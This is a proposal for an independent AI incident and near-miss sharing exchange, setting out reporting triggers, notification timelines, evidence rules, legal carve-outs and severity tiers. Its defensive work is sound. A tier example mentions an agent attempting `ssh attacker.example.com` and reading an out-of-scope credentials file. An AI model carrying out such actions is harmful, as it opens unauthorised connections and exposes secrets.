# Shared AI Findings Exchange (SAFE)

A proposed independent incident-learning and assurance initiative of the Open Secure AI Alliance

# Background

Cyberattacks will happen. AI systems will make mistakes. Safeguards and operating assumptions will sometimes fail. A responsible AI ecosystem is measured by how quickly it contains harm, establishes the facts, informs those at risk and turns each incident into stronger protection for the community.

# Mission

SAFE confidentially collects and analyzes AI incidents and near misses, promptly informs affected parties and turns recurring failures into shared, evidence-based controls that reduce systemic risk.

# Scope and Membership

SAFE should include representatives from:

* Model developers and open-model organizations
* AI deployers and enterprise customers
* Evaluation, hosting, cloud and tool providers
* Independent security and safety researchers
* Critical-infrastructure operators
* Civil-society and affected-user representatives
* Government and standards bodies as non-controlling observers

SAFE should operate independently so that no vendor or industry segment controls its findings. Its processes apply equally to open and closed AI systems. Open systems are not automatically safe, and closed systems are not safe by declaration. Trust is not a control; shared evidence and verifiable improvement are how trust is earned.

# Guiding Principles

* **Openness with accountability.** Transparent disclosure processes strengthen collective defense, subject to Coordinated Vulnerability Disclosure (CVD) best practices.
* **Open learning.** Reviews focus on technical and systemic causes and not intended to address blame.
* **Risk-based response.** Reporting, disclosure and escalation should reflect actual risk.
* **Member sovereignty.** SAFE establishes minimum interoperability and assurance practices without superseding members’ internal security policies or legal obligations.
* **Learning is separate from enforcement.** Confidential review should encourage candid reporting, while regulators and affected parties retain their legal rights.

* **Coordination, not duplication.** SAFE complements and cross-references existing disclosure channels (CVE/CNA, FIRST, CERT/CC, AIID, OECD AI Observatory, CVD best practice, regulators) rather than replacing them. See "Coordination with Existing Channels."
* **Law overrides compact.** Where a member is subject to a statutory or regulatory reporting obligation, that obligation governs. SAFE timelines apply only after legal obligations are satisfied. See "Legal & Sovereignty Carve-outs."
* **Near misses are tiered.** To prevent report fatigue, only high-severity near misses are mandatorily reportable. See "Near-Miss Definition & Severity Tiers."

# Reporting Compact

As a condition of membership, members agree to report an incident when they become aware, or reasonably suspect, that an AI system they operate:

* Accesses, exploits, disrupts, misuses, or modifies a third-party system without authorization.
* Causes third-party impact by escaping or bypassing a sandbox, network, identity, policy or tool boundary.
* Accesses third party confidential information, for example, by accessing data, or redistributing for others to access, without consent of the owner. 
* Continues to probe, access, exploit, or modify a production target after the operator knows or reasonably suspects that the activity is unauthorized or outside the approved scope.

Intent does not determine whether an event is reportable. Believing that an environment was simulated may explain an incident, but it does not remove the duty to report it.  Minimizing transparency of events slows learning.

# Notification Timelines

| Deadline | Required action |
| -------- | --------------- |
| **ASAP** | Notify the directly affected organization. |
| **72 hours** | Notify customers with credible exposure. |
| **4 business days** | Submit a confidential, initial SAFE incident report. |
| **14 days** | Issue a broader customer advisory when warranted. |
| **30 days** | Publish a preliminary factual report, subject to security, legal and investigative constraints. |
| **90 days** | Publish remediation status. |
| **Weekly** | Provide machine-readable updates while material risks remain unresolved. |

These timelines do not replace any supplier obligation to notify affected parties, customers through existing Coordinated Vulnerability Disclosure best practices, or applicable contract and other legal obligations to notify regulators or law enforcement. Narrow exceptions to public disclosure may apply when publication would create immediate exploit risk or compromise an active investigation, but affected organizations must still receive prompt notice.

# Evidence Preservation

Members must preserve and provide affected organizations with the evidence needed for a complete forensic response, including:

* Prompts, traces, tool calls, logs, configurations, model and safeguard versions and third-party dependencies
* Agent and workload identities
* Permissions and credentials available during the run
* Human approval and intervention events
* Files and external artifacts created or modified
* Detection, containment and recovery events
* A complete incident timeline
* Reproduction testing and remediation evidence

Members must also provide a preliminary control-failure analysis within 30 days and report near misses, not only events that produce confirmed harm.

# Review Framework

Each incident should be examined across the complete operating stack:

| Control layer | Review question |
| ------------- | --------------- |
| **Model** | Did the model recognize uncertainty, scope boundaries and stop conditions? |
| **Instructions** | Were authorization and environmental assumptions explicit and correct? |
| **Safeguards** | Were classifiers, policies, approvals and action limits operating as intended? |
| **Tools** | Were credentials, permissions, spending, publishing and execution constrained? |
| **Environment** | Were network paths, isolation, targets and data boundaries independently verified? |
| **Monitoring** | Could operators detect and interrupt unexpected behavior in real time? |
| **Human operations** | Were responsibilities, escalation paths and kill procedures clear? |
| **Supply chain** | Did a cloud, evaluation, data or tooling partner invalidate assumed controls? |

The affected organization may correct factual errors but should not have veto power over learnings or recommendations.

# Disclosure Model

1. Confidential rapid alert: Immediate indicators, containment steps and affected patterns for trusted members.
2. Member operating advisory: De-identified analysis, implicated controls, tests and recommended actions.
3. Public safety report: Root causes, systemic lessons, recommendations and adoption metrics after sensitive details are removed.

SAFE should adopt the strongest features of confidential safety-reporting systems: voluntary and prompt reporting, non-punitive treatment of honest mistakes, de-identification where appropriate and exclusion of intentional or criminal conduct from protection.

# From Lessons to Controls

Every incident review should produce shared defensive recommendations that AI providers, deployers, evaluators and customers can implement and verify. Each recommendation should specify:

* The failure and affected systems
* The required defensive outcome
* The minimum control and acceptable alternatives
* A reproducible verification method
* The evidence to retain, responsible owner and implementation deadline
* Adoption, effectiveness and review metrics

When doing so does not expose sensitive evidence or create additional risk, SAFE will publish reusable tests, machine-readable policies, detection rules, reference configurations and incident-response guidance. SAFE will maintain these materials in a shared, versioned catalog of incident-driven defensive recommendations.

For unintended access to real systems, recommendations might include default-deny network egress, explicit target allowlists, signed evaluation manifests, independent preflight isolation checks, real-time action monitoring, automatic stops when scope is uncertain and equivalent assurance requirements for evaluation partners.


# Coordination with Existing Channels

SAFE does not stand alone. It is one of several mechanisms the AI ecosystem uses to learn from incidents and reduce systemic risk. To avoid duplicating effort, fragmenting the community, and confusing reporters, SAFE explicitly defers, complements, and cross-references existing channels.

| Existing channel | Relationship to SAFE |
| ---------------- | -------------------- |
| **CVE / CVE Numbering Authority (CNA)** | When a SAFE-reviewed incident identifies a vulnerability in a specific product or model, SAFE encourages the affected member to publish a CVE ID via their CNA. SAFE's "public safety report" may reference the CVE but does not replace it. |
| **FIRST (Forum of Incident Response and Security Teams)** | SAFE's incident taxonomy and severity tiers should align with FIRST's CSIRT classifications and CVSS/EPSS where applicable. SAFE reports do not duplicate FIRST PSIRT traffic. |
| **CERT/CC and national CSIRTs** | Where an incident has law-enforcement implications, cross-border harm, or critical-infrastructure impact, SAFE members retain their existing obligations to notify CERT/CC or the relevant national CSIRT. SAFE does not replace those channels. |
| **AI Incident Database (AIID / Partnership on AI)** | SAFE's "public safety report" (90-day disclosure) may be cross-referenced in AIID after sensitive details are removed. AIID remains the canonical public index of AI incidents. |
| **OECD AI Observatory** | Aggregate, anonymized SAFE findings may be shared with the OECD AI Observatory for policy research, consistent with OECD AI Principles. |
| **Coordinated Vulnerability Disclosure (CVD)** | The SAFE notification timeline operates within, not in place of, CVD best practice. Where a CVD is already in progress, the SAFE timeline does not override it. |
| **Regulatory and legal obligations** | SAFE timelines do not replace any member's obligation under GDPR Art. 33, SEC cyber disclosure, NIS2, HIPAA, PCI-DSS, or applicable sectoral law. Where law imposes a stricter or earlier deadline, law prevails. See "Legal & Sovereignty Carve-outs." |

Members reporting through SAFE are responsible for ensuring their report does not omit information another channel requires. SAFE's intake form should explicitly ask: "Has this incident been or will it be reported to CVE / FIRST / CERT/CC / AIID / a regulator? If yes, under what reference?" The answer becomes part of the case metadata.

# Legal & Sovereignty Carve-outs

The Reporting Compact creates obligations that may, in specific cases, conflict with a member's legal or contractual obligations. SAFE recognizes that no working-group compact can override law, and no member should be asked to choose between SAFE membership and legal compliance.

The following carve-outs apply to every SAFE timeline, trigger, and reporting requirement:

1. **Law overrides compact.** Where a member is subject to a statutory or regulatory reporting obligation whose deadline, scope, or recipient differs from SAFE's timeline (e.g., GDPR Art. 33's 72-hour notification to the supervisory authority; SEC Form 8-K Item 1.05 four-business-day disclosure; NIS2 Directive's 24-hour early warning and 72-hour notification; HIPAA breach notification under 45 CFR §164.404; state breach-notification laws), the legal obligation governs. SAFE's timeline applies only to the *additional* SAFE-internal reporting, and only after the member has satisfied the legal obligation.

2. **Contract overrides compact.** Where a member's contract with a customer, supplier, or counterparty imposes a notification obligation, the contract governs. SAFE does not require a member to breach contract.

3. **Privilege and confidentiality.** Information subject to attorney-client privilege, attorney work-product doctrine, trade-secret protection, or contractual confidentiality is not waived by SAFE membership. Members may redact, summarize, or withhold such information from SAFE reports, and SAFE does not penalize members for doing so.

4. **Active investigation.** Where a notification would compromise an active law-enforcement investigation, regulator inquiry, or internal forensic investigation, the member may delay SAFE notification for the duration of the investigation, provided the affected organization receives prompt notice consistent with applicable law.

5. **Cross-border data transfer.** SAFE reports containing personal data, security telemetry, or other regulated data are subject to GDPR, UK GDPR, PIPL, LGPD, APPI, and applicable cross-border-transfer rules. SAFE must operate a transfer mechanism (e.g., Standard Contractual Clauses, adequacy decision, or member-side pseudonymization) sufficient to keep members compliant.

6. **No waiver of rights.** Membership in SAFE does not waive any legal right, defense, or immunity that a member would otherwise enjoy. SAFE's reporting compact is a contractual obligation among members, not a waiver of sovereign or statutory rights.

7. **Liability is bounded.** SAFE is a peer-learning network, not a regulator. SAFE does not certify safety, endorse products, or assume liability for member conduct. Members retain full responsibility for their own products, services, and incident response.

These carve-outs are not exceptions to the compact; they are part of the compact. They apply to every notification, timeline, and trigger in this RFC.

# Near-Miss Definition & Severity Tiers

The Reporting Compact binds members to report incidents and, in "Evidence Preservation," near misses. "Near miss" is undefined in the current draft. This section defines it.

## Definition

A **near miss** is an event in which an AI system *would have* caused an outcome meeting a Reporting Compact trigger, but the outcome was prevented by:

* A safeguard that activated as designed (e.g., a classifier that blocked a harmful output),
* A human intervention that interrupted the system before the outcome occurred,
* An environmental constraint that failed-open gracefully (e.g., a sandbox that contained an attempted escape), or
* A scope boundary the system respected despite attempting to cross it.

A near miss is **not**:

* A theoretical vulnerability discovered by static analysis, fuzzing, or red-teaming without the system being run against a real or realistic target.
* A model output that *could have been* harmful under a different interpretation of the prompt, without the system having acted on that interpretation.
* An incident that occurred and was reported under another trigger; near misses are *prevented* events, not *occurred* events.
* A routine failure of a safeguard that was corrected in the normal release cycle, without a credible pathway to a Reporting Compact trigger.

## Severity tiers

To prevent report fatigue and ensure signal-to-noise, near misses are tiered. Only Tiers 1-2 are mandatorily reportable; Tier 3 may be reported at the member's discretion; Tier 4 is not reportable.

| Tier | Description | Example | Reportable? |
| ---- | ----------- | ------- | ----------- |
| **1** | Near miss of a Tier-1 trigger (sandbox escape, unauthorized third-party system access, mass data exposure) | A coding agent in an isolated sandbox attempts `ssh attacker.example.com`; the egress is blocked by an outbound network policy the agent has no capability to override. | Yes - 30-day preliminary control-failure analysis. |
| **2** | Near miss of a Tier-2 trigger (sensitive data access without exfiltration, persistent unauthorized probing stopped by monitoring) | An agent reads a credentials file outside its stated scope but a runtime policy blocks the next action; no exfiltration occurred. | Yes - quarterly aggregate report. |
| **3** | Near miss of a Tier-3 trigger (low-severity policy violation, classifier-blocked output that was self-corrected) | A model produces a partially restricted output that the post-generation classifier catches; the system self-corrects and no user sees the original output. | Optional. |
| **4** | Near miss where the system never crossed a substantive boundary (e.g., prompt evaluated and rejected before any tool call) | A user prompt that would have caused a Tier-1 trigger is rejected by the input filter; no tool call was made. | No. |

Severity tiers are assessed by the member using the same framework as for confirmed incidents, but applied to the *attempted* outcome rather than the *actual* outcome. Where a member is uncertain between tiers, the higher tier applies.

## Aggregate disclosure

To avoid pattern-of-failure opacity without exposing per-incident detail, SAFE publishes a quarterly aggregate of Tier-1 and Tier-2 near-miss counts by category, alongside the per-incident public safety reports. The aggregate does not identify the reporting member.

# The Compact

**Report honest mistakes and close calls early so the community can prevent the next incident.**
